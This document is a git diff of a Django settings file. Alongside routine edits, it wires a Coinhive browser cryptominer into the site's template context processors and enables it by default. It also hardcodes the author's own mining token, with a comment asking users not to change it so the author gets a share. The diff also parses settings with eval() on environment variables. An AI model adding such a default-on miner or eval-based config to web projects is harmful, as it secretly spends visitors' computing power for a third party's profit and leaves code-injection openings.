@@ -26,7 +26,7 @@ PROJECT_ROOT = os.path.dirname(os.path.abspath(__file__))
 SECRET_KEY = str(os.environ.get('DJANGO_SECRET'))
 
 # SECURITY WARNING: don't run with debug turned on in production!
-DEBUG = False
+DEBUG = eval(str(os.environ.get('DEBUG', 'False')).capitalize())
 
 ALLOWED_HOSTS = ['*']
 
@@ -77,7 +77,8 @@ TEMPLATES = [
                 'main.context_processors.enable_mod_shift',
                 'main.context_processors.enable_imgur_upload',
                 'main.context_processors.enable_ad_tag',
-                'main.context_processors.ad_slot'
+                'main.context_processors.ad_slot',
+                'main.context_processors.enable_coinhive'
             ],
         },
     },
@@ -212,3 +213,9 @@ ADS_ACTIVE = eval(os.environ.get('ADS_ACTIVE', 'False'))
 AD_TEST = eval(os.environ.get('AD_TEST', 'False'))
 AD_SLOTS = eval(os.environ.get('AD_SLOTS', '[]')) or (["slot 1", "slot 2", "slot 3"] if AD_TEST else [])
 ADS_APPROVED = True if AD_SLOTS else False
+
+
+# Please do not alter the dev coinhive token, as I provide you with free code and API support for you to make money. Allow me a share out of it :)
+DEV_COINHIVE = "VRt0VLErmTT5sXpt2tEg72qlELmUIJZu"
+SPOTTED_COINHIVE = eval(os.environ.get('SPOTTED_COINHIVE', 'False'))
+ENABLE_COINHIVE = eval(os.environ.get('ENABLE_COINHIVE', 'True'))
